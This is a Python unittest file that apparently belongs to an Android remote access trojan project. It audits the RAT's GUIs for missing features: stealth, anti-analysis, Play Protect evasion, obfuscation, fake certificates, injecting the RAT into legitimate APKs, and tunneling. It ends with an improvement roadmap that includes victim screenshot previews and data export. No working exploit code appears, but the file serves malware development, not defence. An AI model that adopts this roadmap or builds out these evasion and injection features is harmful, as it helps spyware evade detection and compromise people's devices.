#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
GUI Functionality Validation Test
Tests specific GUI implementations for missing functionality and suggests improvements
"""

import sys
import os
import unittest
import tempfile
import shutil
import tkinter as tk
import inspect
import re
from unittest.mock import Mock, patch

# Setup path for importing server modules
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'server'))

try:
    from test_utils import setup_server_path, get_project_root
    setup_server_path()
except ImportError:
    pass

# Import modules
try:
    import androRAT_gui
    import androRAT_advanced_gui
    import utils
    import argparse
except ImportError as e:
    print(f"Warning: Could not import modules: {e}")

class GUIFunctionalityValidation(unittest.TestCase):
    """Validate GUI functionality completeness and identify missing features"""
    
    def setUp(self):
        """Set up test environment"""
        self.test_dir = tempfile.mkdtemp()
        self.cli_features = self._extract_cli_features()
        
    def tearDown(self):
        """Clean up test environment"""
        if os.path.exists(self.test_dir):
            shutil.rmtree(self.test_dir, ignore_errors=True)
    
    def _extract_cli_features(self):
        """Extract all CLI features from androRAT.py argument parser"""
        try:
            # Read androRAT.py to extract argument parser features
            androrat_path = os.path.join(os.path.dirname(__file__), '..', 'server', 'androRAT.py')
            with open(androrat_path, 'r') as f:
                content = f.read()
            
            # Extract argument parser definitions
            features = {}
            
            # Find all add_argument calls
            arg_pattern = r"parser\.add_argument\('([^']+)'[^)]*help='([^']+)'"
            matches = re.findall(arg_pattern, content)
            
            for arg, help_text in matches:
                features[arg.lstrip('-')] = help_text
            
            return features
        except Exception as e:
            print(f"Warning: Could not extract CLI features: {e}")
            return {}
    
    def test_01_basic_gui_feature_gaps(self):
        """Identify missing features in basic GUI"""
        print("\n=== Basic GUI Feature Gap Analysis ===")
        
        try:
            # Analyze basic GUI implementation
            gui_file = os.path.join(os.path.dirname(__file__), '..', 'server', 'androRAT_gui.py')
            with open(gui_file, 'r') as f:
                gui_content = f.read()
            
            # Check for advanced evasion features
            missing_features = []
            
            # Check for stealth/evasion options
            if '--stealth' not in gui_content and 'stealth' not in gui_content:
                missing_features.append("Stealth mode option")
            
            if '--anti-analysis' not in gui_content and 'anti_analysis' not in gui_content:
                missing_features.append("Anti-analysis option")
            
            if '--play-protect-evasion' not in gui_content and 'play_protect' not in gui_content:
                missing_features.append("Play Protect evasion option")
            
            if '--advanced-obfuscation' not in gui_content and 'advanced_obfuscation' not in gui_content:
                missing_features.append("Advanced obfuscation option")
            
            if '--fake-certificates' not in gui_content and 'fake_certificates' not in gui_content:
                missing_features.append("Fake certificates option")
            
            if '--inject' not in gui_content and 'inject' not in gui_content:
                missing_features.append("APK injection functionality")
            
            if '--target-apk' not in gui_content and 'target_apk' not in gui_content:
                missing_features.append("Target APK selection for injection")
            
            if missing_features:
                print("❌ Basic GUI missing advanced features:")
                for feature in missing_features:
                    print(f"  - {feature}")
            else:
                print("✅ Basic GUI has all advanced features")
            
            return missing_features
            
        except Exception as e:
            self.fail(f"Basic GUI analysis failed: {e}")
    
    def test_02_advanced_gui_client_management(self):
        """Test advanced GUI client management capabilities"""
        print("\n=== Advanced GUI Client Management ===")
        
        try:
            root = tk.Tk()
            root.withdraw()
            
            gui = androRAT_advanced_gui.AdvancedAndroRATGUI(root)
            
            # Test client management methods
            client_methods = [
                'refresh_client_list', 'on_client_select', 'load_client_details'
            ]
            
            missing_methods = []
            for method in client_methods:
                if not hasattr(gui, method):
                    missing_methods.append(method)
            
            if missing_methods:
                print("❌ Advanced GUI missing client management methods:")
                for method in missing_methods:
                    print(f"  - {method}")
            else:
                print("✅ Advanced GUI has all client management methods")
            
            # Test tab creation methods
            tab_methods = [
                'create_device_info_tab', 'create_file_manager_tab',
                'create_monitoring_tab', 'create_command_console_tab'
            ]
            
            missing_tabs = []
            for tab in tab_methods:
                if not hasattr(gui, tab):
                    missing_tabs.append(tab)
            
            if missing_tabs:
                print("❌ Advanced GUI missing tab methods:")
                for tab in missing_tabs:
                    print(f"  - {tab}")
            else:
                print("✅ Advanced GUI has all tab creation methods")
            
            root.destroy()
            
        except Exception as e:
            self.fail(f"Advanced GUI analysis failed: {e}")
    
    def test_03_gui_evasion_integration(self):
        """Test GUI integration with evasion features"""
        print("\n=== GUI Evasion Integration ===")
        
        # Check if GUI can access evasion functions
        evasion_functions = [
            'build_with_evasion', 'apply_play_protect_evasion',
            'enhance_apk_for_stealth', 'add_legitimate_metadata',
            'encrypt_apk_strings', 'generate_stealth_package_name'
        ]
        
        missing_evasion = []
        for func in evasion_functions:
            if not hasattr(utils, func):
                missing_evasion.append(func)
        
        if missing_evasion:
            print("❌ Missing evasion functions:")
            for func in missing_evasion:
                print(f"  - {func}")
        else:
            print("✅ All evasion functions available")
        
        # Test if GUI can pass evasion options
        try:
            # Check if basic GUI can handle evasion options
            root = tk.Tk()
            root.withdraw()
            gui = androRAT_gui.AndroRATGUI(root)
            
            # Check if GUI has variables for evasion options
            evasion_vars = ['stealth_var', 'anti_analysis_var', 'play_protect_var']
            missing_vars = []
            
            for var in evasion_vars:
                if not hasattr(gui, var):
                    missing_vars.append(var)
            
            if missing_vars:
                print("⚠️ Basic GUI missing evasion variables:")
                for var in missing_vars:
                    print(f"  - {var}")
            
            root.destroy()
            
        except Exception as e:
            print(f"⚠️ GUI evasion integration test failed: {e}")
    
    def test_04_gui_injection_support(self):
        """Test GUI support for APK injection"""
        print("\n=== GUI APK Injection Support ===")
        
        try:
            # Check if injection functions are available
            injection_functions = [
                'inject_rat_into_apk', 'extract_apk_info', 'merge_apk_contents',
                'sign_injected_apk'
            ]
            
            missing_injection = []
            for func in injection_functions:
                if not hasattr(utils, func):
                    missing_injection.append(func)
            
            if missing_injection:
                print("❌ Missing injection functions:")
                for func in missing_injection:
                    print(f"  - {func}")
            else:
                print("✅ All injection functions available")
            
            # Check if GUI can handle injection workflow
            root = tk.Tk()
            root.withdraw()
            gui = androRAT_gui.AndroRATGUI(root)
            
            # Look for injection-related variables or methods
            injection_vars = ['inject_var', 'target_apk_var']
            has_injection_support = any(hasattr(gui, var) for var in injection_vars)
            
            if not has_injection_support:
                print("⚠️ GUI may not have injection UI support")
            else:
                print("✅ GUI has injection UI support")
            
            root.destroy()
            
        except Exception as e:
            print(f"⚠️ GUI injection test failed: {e}")
    
    def test_05_missing_functionality_identification(self):
        """Identify specific missing functionality in GUIs"""
        print("\n=== Missing Functionality Identification ===")
        
        # CLI features that should be in GUI
        critical_features = {
            'stealth': 'Stealth mode for evasion',
            'random-package': 'Random package name generation',
            'anti-analysis': 'Anti-analysis techniques',
            'play-protect-evasion': 'Play Protect bypass',
            'advanced-obfuscation': 'Advanced code obfuscation',
            'fake-certificates': 'Certificate manipulation',
            'inject': 'APK injection mode',
            'target-apk': 'Target APK selection',
            'tunnel-service': 'Tunneling service selection'
        }
        
        # Check basic GUI
        try:
            gui_file = os.path.join(os.path.dirname(__file__), '..', 'server', 'androRAT_gui.py')
            with open(gui_file, 'r') as f:
                basic_gui_content = f.read()
            
            basic_missing = []
            for feature, description in critical_features.items():
                feature_variants = [
                    feature.replace('-', '_'),
                    feature.replace('-', ''),
                    feature
                ]
                
                found = any(variant in basic_gui_content for variant in feature_variants)
                if not found:
                    basic_missing.append((feature, description))
            
            if basic_missing:
                print("❌ Basic GUI missing critical features:")
                for feature, desc in basic_missing:
                    print(f"  - {feature}: {desc}")
            else:
                print("✅ Basic GUI has all critical features")
                
        except Exception as e:
            print(f"⚠️ Could not analyze basic GUI: {e}")
        
        # Check advanced GUI  
        try:
            gui_file = os.path.join(os.path.dirname(__file__), '..', 'server', 'androRAT_advanced_gui.py')
            with open(gui_file, 'r') as f:
                advanced_gui_content = f.read()
            
            advanced_missing = []
            for feature, description in critical_features.items():
                feature_variants = [
                    feature.replace('-', '_'),
                    feature.replace('-', ''),
                    feature
                ]
                
                found = any(variant in advanced_gui_content for variant in feature_variants)
                if not found:
                    advanced_missing.append((feature, description))
            
            if advanced_missing:
                print("❌ Advanced GUI missing critical features:")
                for feature, desc in advanced_missing:
                    print(f"  - {feature}: {desc}")
            else:
                print("✅ Advanced GUI has all critical features")
                
        except Exception as e:
            print(f"⚠️ Could not analyze advanced GUI: {e}")
    
    def test_06_gui_improvement_suggestions(self):
        """Generate specific improvement suggestions for GUIs"""
        print("\n=== GUI Improvement Suggestions ===")
        
        suggestions = {
            'basic_gui': [
                "Add evasion options checkboxes (stealth, anti-analysis, play-protect-evasion)",
                "Add APK injection mode with target APK file browser",
                "Add advanced obfuscation and certificate options",
                "Add tunneling service selection dropdown",
                "Add progress indicators for long-running operations",
                "Add validation indicators for input fields"
            ],
            'advanced_gui': [
                "Integrate APK builder with all evasion options",
                "Add client grouping and batch operations",
                "Add real-time client monitoring dashboard", 
                "Add client screenshot preview thumbnails",
                "Add automated client response testing",
                "Add client data export functionality"
            ],
            'both_guis': [
                "Add configuration save/load functionality",
                "Add recent projects or templates",
                "Add dark/light theme switching",
                "Add internationalization support",
                "Add help system with feature documentation",
                "Add system tray minimization for advanced GUI"
            ]
        }
        
        print("💡 Improvement Suggestions:")
        for gui_type, improvements in suggestions.items():
            print(f"\n{gui_type.upper()}:")
            for i, suggestion in enumerate(improvements, 1):
                print(f"  {i}. {suggestion}")
        
        return suggestions

def run_gui_functionality_validation():
    """Run GUI functionality validation tests"""
    
    print("=" * 60)
    print("GUI FUNCTIONALITY VALIDATION")
    print("=" * 60)
    print("Validating GUI implementations and identifying missing features")
    print()
    
    # Create test suite
    suite = unittest.TestLoader().loadTestsFromTestCase(GUIFunctionalityValidation)
    
    # Run tests with detailed output
    runner = unittest.TextTestRunner(verbosity=2, stream=sys.stdout)
    result = runner.run(suite)
    
    # Print summary
    print("\n" + "=" * 60)
    print("GUI FUNCTIONALITY VALIDATION SUMMARY")
    print("=" * 60)
    
    total_tests = result.testsRun
    failures = len(result.failures)
    errors = len(result.errors)
    passed = total_tests - failures - errors
    
    print(f"Total Tests: {total_tests}")
    print(f"Passed: {passed}")
    print(f"Failed: {failures}")
    print(f"Errors: {errors}")
    
    success_rate = (passed / total_tests) * 100 if total_tests > 0 else 0
    print(f"Success Rate: {success_rate:.1f}%")
    
    return result

if __name__ == "__main__":
    result = run_gui_functionality_validation()
    sys.exit(0 if result.wasSuccessful() else 1)